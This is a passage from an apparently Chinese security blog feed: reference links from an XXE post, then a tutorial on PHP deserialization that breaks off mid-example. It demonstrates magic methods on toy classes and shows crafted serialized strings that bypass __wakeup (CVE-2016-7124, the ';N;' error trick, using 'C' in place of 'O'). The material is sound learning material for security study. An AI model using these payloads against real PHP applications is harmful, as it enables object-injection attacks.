href="https://www.cnblogs.com/SUN99bk/p/11826523.html">XML之DTD</a><br><a href="https://xi4or0uji.github.io/2018/11/29/xxe%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/#XML">xxe漏洞攻击与防御</a><br><a href="https://www.rc.sb/xxe/#%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95">XXE 漏洞总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;从XML到XXE&quot;&gt;&lt;a href=&quot;#从XML到XXE&quot; class=&quot;headerlink&quot; title=&quot;从XML到XXE&quot;&gt;&lt;/a&gt;从XML到XXE&lt;/h1&gt;&lt;h2 id=&quot;XML&quot;&gt;&lt;a href=&quot;#XML&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="xxe" scheme="https://www.lewiserii.top/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93.html</id>
    <published>2023-02-10T04:00:00.000Z</published>
    <updated>2023-02-15T05:17:19.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()： 在创建对象时候初始化对象，一般用于对变量赋初值。<br><span class="hljs-title function_ invoke__">__destruct</span>()： 和构造函数相反，当对象所在函数调用完毕后执行。<br><span class="hljs-title function_ invoke__">__call</span>()： 当调用对象中不存在的方法会自动调用该方法。<br><span class="hljs-title function_ invoke__">__get</span>()： 获取对象不存在的属性时执行此函数。<br><span class="hljs-title function_ invoke__">__set</span>()： 设置对象不存在的属性时执行此函数。<br><span class="hljs-title function_ invoke__">__toString</span>()： 当对象被当做一个字符串使用时调用。<br><span class="hljs-title function_ invoke__">__sleep</span>()： 序列化对象之前就调用此方法(其返回需要一个数组)<br><span class="hljs-title function_ invoke__">__wakeup</span>()： 反序列化恢复对象之前调用该方法<br><span class="hljs-title function_ invoke__">__isset</span>()： 在不可访问的属性上调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()触发<br><span class="hljs-title function_ invoke__">__unset</span>()： 在不可访问的属性上使用<span class="hljs-keyword">unset</span>()时触发<br><span class="hljs-title function_ invoke__">__invoke</span>()： 将对象当作函数来使用时执行此方法<br></code></pre></td></tr></table></figure><h2 id="construct-amp-destruct"><a href="#construct-amp-destruct" class="headerlink" title="__construct &amp; __destruct"></a>__construct &amp; __destruct</h2><p><code>__construct</code>：在实例化一个对象时，会被自动调用，可以作为非public权限属性的初始化<br><code>__destruct</code>：和构造函数相反，当对象销毁时会调用此方法，一是用户主动销毁对象，二是当程序结束时由引擎自动销毁</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct\n&quot;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;abc\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;--------------------\n&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;abc\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct<br>__destruct<br>abc<br>--------------------<br>__construct<br>abc<br>__destruct<br></code></pre></td></tr></table></figure><h2 id="sleep-amp-wakeup"><a href="#sleep-amp-wakeup" class="headerlink" title="__sleep &amp; __wakeup"></a>__sleep &amp; __wakeup</h2><p><code>__sleep</code>：序列化时自动调用<br><code>__wakeup</code>：反序列化时自动调用</p><blockquote><p>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，<br>则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__sleep\n&quot;</span>;<br><span class="hljs-keyword">return</span> [username,password]; <span class="hljs-comment">//需要返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup\n&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;user&#x27;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;-----------------------------\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>));<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct<br>__sleep<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;admin888&quot;</span>;&#125;<br>-----------------------------<br>__wakeup<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>#2 (2) </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;user&quot;</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;admin888&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="call-amp-callstatic"><a href="#call-amp-callstatic" class="headerlink" title="__call &amp; __callstatic"></a>__call &amp; __callstatic</h2><p><code>__call</code>：对象执行类不存在的方法时会自动调用<code>__call</code>方法<br><code>__callstatic</code>：直接执行类不存在的方法时会自动调用<code>__callstatic</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不存在&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&#x27;方法(__call)&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callstatic</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不存在&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&#x27;方法(__callstatic)&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">lewiserii</span>();<br>test::<span class="hljs-title function_ invoke__">lewiserii</span>();<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">不存在lewiserii方法(__call)<br>不存在lewiserii方法(__callstatic)<br></code></pre></td></tr></table></figure><h2 id="get-amp-set"><a href="#get-amp-set" class="headerlink" title="__get &amp; __set"></a>__get &amp; __set</h2><p><code>__get</code>：对不可访问属性或不存在属性进行 访问引用时自动调用<br><code>__set</code>：对不可访问属性或不存在属性进行 写入时自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__get\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$value</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__set\n&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;password;<br><span class="hljs-variable">$a</span>-&gt;password=<span class="hljs-string">&#x27;123456&#x27;</span>;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">__get<br>__set<br></code></pre></td></tr></table></figure><h2 id="isset-amp-unset"><a href="#isset-amp-unset" class="headerlink" title="__isset &amp; __unset"></a>__isset &amp; __unset</h2><p><code>__isset</code>：在不可访问的属性上使用<code>inset()</code>时触发<br><code>__unset</code>：在不可访问的属性上使用<code>unset()</code>时触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__isset\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__unset\n&quot;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>-&gt;password);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>-&gt;psd);<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">__isset<br>__unset<br></code></pre></td></tr></table></figure><h2 id="tostring"><a href="#tostring" class="headerlink" title="__tostring"></a>__tostring</h2><p><code>__toString()</code>：类的实例和字符串拼接或者作为字符串引用时会自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;tostring&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">tostring<br></code></pre></td></tr></table></figure><h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h2><p><code>__invoke()</code>：将对象当作函数来使用时调用此方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__invoke&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>();<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">__invoke<br></code></pre></td></tr></table></figure><h1 id="反序列化绕过的几种方法"><a href="#反序列化绕过的几种方法" class="headerlink" title="反序列化绕过的几种方法"></a>反序列化绕过的几种方法</h1><h2 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h2><h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><blockquote><p>利用条件：<br>PHP5 &lt; 5.6.25<br>​PHP7 &lt; 7.0.10</p></blockquote><p>利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//$v = new test();</span><br><span class="hljs-comment">//echo serialize($v);</span><br><span class="hljs-comment">//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;test</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);</code>时会返回<code>aaa</code>，在修改对象属性个数的值，执行<code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);</code>会返回<code>test</code></p><h3 id="利用反序列化字符串报错"><a href="#利用反序列化字符串报错" class="headerlink" title="利用反序列化字符串报错"></a>利用反序列化字符串报错</h3><p>利用一个包含<code>__destruct</code>方法的类触发魔术方法可绕过<code>__wakeup</code>方法</p><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__get(<span class="hljs-subst">$name</span>)\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__destruct\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__wakeup\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C::__destruct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;b;<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;;N;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>原本应该是<code>O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;&#125;</code><br>调用顺序是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">D::<span class="hljs-variable constant_">__wakeup</span><br>C::<span class="hljs-variable constant_">__destruct</span><br>D::<span class="hljs-title function_ invoke__">__get</span>(b)<br>D::<span class="hljs-variable constant_">__destruct</span><br></code></pre></td></tr></table></figure><p>添加了一个<code>;N;</code>(反序列化末尾加上<code>;任意字符;</code>)的错误结构后调用顺序就变成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">C::<span class="hljs-variable constant_">__destruct</span><br>D::<span class="hljs-title function_ invoke__">__get</span>(b)<br>D::<span class="hljs-variable constant_">__wakeup</span><br>D::<span class="hljs-variable constant_">__destruct</span><br></code></pre></td></tr></table></figure><p>来自Article_kelp师傅的原理解释，orz：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-4.jpg"></p><h3 id="使用C代替O"><a href="#使用C代替O" class="headerlink" title="使用C代替O"></a>使用C代替O</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">a - <span class="hljs-keyword">array</span><br>b - <span class="hljs-keyword">boolean</span><br>d - <span class="hljs-keyword">double</span><br>i - <span class="hljs-keyword">integer</span><br>o - common <span class="hljs-keyword">object</span><br>r - reference<br>s - <span class="hljs-keyword">string</span><br>C - custom <span class="hljs-keyword">object</span><br>O - <span class="hljs-class"><span class="hljs-keyword">class</span></span><br><span class="hljs-class"><span class="hljs-title">N</span> - <span class="hljs-title">null</span></span><br><span class="hljs-class"><span class="hljs-title">R</span> - <span class="hljs-title">pointer</span> <span class="hljs-title">reference</span></span><br><span class="hljs-class"><span class="hljs-title">U</span> - <span class="hljs-title">unicode</span> <span class="hljs-title">string</span></span><br></code></pre></td></tr></table></figure><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span 